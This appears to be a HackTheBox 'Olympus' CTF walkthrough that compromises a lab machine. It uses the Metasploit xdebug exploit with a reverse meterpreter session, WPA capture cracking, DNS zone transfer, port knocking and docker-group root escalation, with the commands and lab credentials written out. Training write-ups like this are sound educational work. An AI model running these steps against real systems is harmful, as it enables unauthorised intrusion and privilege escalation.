@@ -1,0 +1,85 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">HacktheBox Olympus Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-olympus-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-10-04T18:39:54+00:00">October 4, 2018</time><time class="updated" datetime="2025-07-05T15:06:37+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “Olympus”. Olympus is a retired vulnerable lab presented by Hack the Box for helping pentesters to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.</span></p>
+<p><span style="color: #000000;"><strong>Level: Easy</strong></span></p>
+<p><span style="color: #000000;"><strong>Task: To find user.txt and root.txt file </strong></span></p>
+<p><span style="color: #000000;">Note: Since these labs are online available therefore they have static IP. The IP of Olympus is 10.10.10.83</span></p>
+<h3><span style="color: #800000;"><u>Walkthrough</u></span></h3>
+<p><span style="color: #000000;">Let’s start off with our basic nmap command to find out the open ports and services.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.83</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CM9bO5lgM8I/W7ZcSyDvS6I/AAAAAAAAakM/XIjVKzctZWg18L3ZKYC5_1ex4DkYX_EMgCLcBGAs/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">From scanning through nmap, we found that here port 22 is filtered for SSH but instead of that port 2222 is also open for SSH. Moreover, port 53 is open for DNS where it has grabbed banner “Bind” and even it found the port 80 is opened for Apache http server. Therefore firstly, let’s navigate to port 80 in the web browser.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ty3aaGouDEw/W7ZcUK18_vI/AAAAAAAAakk/W9uT7ELrGds1NzNNCcgNx63IGGBGPXWhQCLcBGAs/s1600/2.png"/></span></p>
+<p><span style="color: #000000;">After exploring target IP in the web browser, we were welcomed by a Zeus picture as shown in the above image. Unfortunately! Here we are unable to find any remarkable clue, therefore we have decided to run Nikto for scanning possible vulnerabilities.</span></p>
+<p><span style="color: #000000;">Let’s find the list of possible vulnerabilities using <strong>Nikto</strong>:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nikto -h http://10.10.10.83</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-YnG0oV_XXx0/W7ZcUtPrBCI/AAAAAAAAako/30YA5_MZI7M702i9aEU6ZeMuENoEo5MiQCLcBGAs/s1600/3.png"/></span></p>
+<p><span style="color: #000000;">Scanning with Nikto gave us a clue to move forward which is <strong>Uncommon header ‘xdebug’. </strong>Searching the keyword <strong>‘xdebug’</strong> on google gave us a result about ‘xdebug’ command execution exploits module for Metasploit. After that load Metasploit on your terminal and use the commands as follows:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/unix/http/xdebug_unauth_exec
+msf (exploit/unix/http/xdebug_unauth_exec) &gt; set rhost 10.10.10.83
+msf (exploit/unix/http/xdebug_unauth_exec) &gt; set lhost 10.10.14.13
+msf (exploit/unix/http/xdebug_unauth_exec) &gt; exploit</pre>
+<p><span style="color: #000000;"><strong>Boom!! </strong>We have got the <strong>meterpreter</strong> of the <strong>target</strong> <strong>machine</strong>. Then further exploring directories, we noticed a directory <strong>/zeus</strong> which got a subdirectory /<strong>airgeddon</strong>. As you can relate it with the image below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8CH7SULLX7Y/W7ZcU8XySwI/AAAAAAAAaks/x7fCggtWpDkXgubCLPbN2V_PdwGJ4-PLwCLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">Then inside the /<strong>airgeddon</strong> directory, we opened its subdirectory <strong>/captured</strong> which shows a file <strong>captured.cap.</strong><br/>
+</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls
+cd /home
+ls
+cd zeus
+ls</pre>
+<p>It could be another clue, therefore we <strong>downloaded this file</strong> on our Kali Desktop as you can see in the image below.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd airgeddon
+ls
+cat pindb_checksum.txt
+cd captured
+ls
+download captured.cap /root/Desktop/
+cat papyrus.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-E6Gzu4hW418/W7ZcVJ5MgII/AAAAAAAAakw/wI-JQWGHeWwQ5w1Ooz-fm1pQv_-QL0kfwCLcBGAs/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">After downloading capture.cap file, we need to analyze it. So when we open this file, it was a Wireshark pcap file and by streaming the 1<sup>st</sup> packet we noticed <strong>SSID: Too_clOse_to_th3_Sun </strong>as shown in the image. This can be probably used as a Password.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-sZNQBzJaczg/W7ZcVIQZKcI/AAAAAAAAak0/jwPA3J8k0XwljtCmA0BCGHf3JwVZB83sQCLcBGAs/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">Now cracking the file captured.cap using aircrack following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">aircrack-ng captured.cap -w /usr/share/wordlists/rockyou.txt</pre>
+<p><span style="color: #000000;">After a few minutes, we have found the <strong>key: flightoficarus</strong> as shown in the image below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-hUeIQJpF6Gg/W7ZcVSodu4I/AAAAAAAAak4/JeijIl5JE5IJv9VK3Ikj0tYw0zaUpoP7QCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">We thought <strong>icarus</strong> could be a username too. Because earlier when we search “<strong>Too close to the Sun</strong>” in the Google, it shows the wiki page of <strong>icarus</strong>. Therefore the following combination of credentials can be used for SSH login via port 2222.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">icarus:Too_clOse_to_th3_Sun
+ssh icarus@10.10.10.83 -p 2222</pre>
+<p><span style="color: #000000;">After successfully logging into SSH on navigating further, we acquired a file <strong>“help_of_the_gods.txt”</strong>. After reading the file it shows us a domain name <strong>ctfolympus.htb </strong>as shown in the image below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-U1DAZPuiLtI/W7ZcVV8cLtI/AAAAAAAAak8/7eOS3mS5gZcPaNrvJ0hMNuj3jWne4Dn-wCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">We thought of trying <strong>DNS zone transfer</strong> since <strong>dig</strong> uses the <strong>axfr</strong> response to retrieve your zone information.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dig axfr @10.10.10.83 ctfolympus.htb</pre>
+<p><span style="color: #000000;">From the result, we figured that <strong>pormetheus</strong> can be another username and <strong>St34l_th3_F1re!</strong> could be the possible password. Also, there is a series of some random port numbers<strong> 3456 8234 62431</strong> and this brings us to ponder on port Knocking that can change the state of <strong>SSH port 22</strong> from <strong>filtered to open.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-APDN7Ofbd8o/W7ZcS_2xdrI/AAAAAAAAakQ/VPacVb5LUEkkwHeIC-DfwK0OxZNlObxSACLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">We knocked these ports by executing the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">knock -v 10.10.10.83 3456 8234 62431</pre>
+<p><span style="color: #000000;">After knocking these ports just to confirm the state of SSH port 22 by using nmap scan. Here we succeeded in making the SSH port open.</span></p>
+<pre class="lang:default decode:true ">nmap -p22 10.10.10.83</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-DTJ6HGHXWEY/W7ZcTIaDCtI/AAAAAAAAakU/07tbxvJWeqIqlklOCoiQXOqJTcCLhzHawCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">Now by logging into SSH port 22 by using the given below credentials:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Prometheus: St34l_th3_F1re!</pre>
+<p><span style="color: #000000;"><strong>Here!! </strong>We have found and read <strong>user.txt.</strong></span></p>
+<p><span style="color: #000000;">Yuppie!! We have completed our first task, moving on towards the second task.</span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://2.bp.blogspot.com/-04ykMm8iibQ/W7ZcTYBcdRI/AAAAAAAAakY/-Rz9g4XwlHQvbs6nwfi2LOMQqb7EZTjVACLcBGAs/s1600/14.png"/></strong></span></p>
+<p><span style="color: #000000;">Then using <strong>id command, </strong>it came into notice that <strong>prometheus</strong> is in <strong>docker</strong> <strong>users group. </strong>Let’s have a look at <strong>docker images</strong> and <strong>docker ps</strong> as shown in the image below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">docker image
+docker ps</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://2.bp.blogspot.com/-cgUraEJIgFQ/W7ZcT7blM_I/AAAAAAAAakc/0A2QxbhfBMwcmnW5f-b7fFdFJoGUq1RAgCLcBGAs/s1600/16.png"/></strong></span></p>
+<p><span style="color: #000000;">By executing the above command we notice there is a docker_image “olympia” hence we can create a copy of a bash with the following command to escalate root privileges:</span></p>
+<p><span style="color: #000000;"><strong>Time to get root.txt!!</strong></span></p>
+<p><span style="color: #000000;">After looking for some information on how to exploit this, we find that we can access it as <strong>root by using the following command:</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">docker run -v /:/root -i -t olympia /bin/bash</pre>
+<p><span style="color: #000000;">Booyah!! We have found <strong>root.txt</strong> and from the image below you can see we have obtained the <strong>value of root.txt.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-tUH-Gm7903g/W7ZcT3gjTfI/AAAAAAAAakg/q81jZ1vGhCU9Am04Dvwz1Th9K2U-JIUQACLcBGAs/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. See’s things from a different angle and an out of the box thinker. Contact <strong><u><a style="color: #000000;" href="https://www.linkedin.com/in/ashray-gupta-b77221b6/">Here</a></u></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
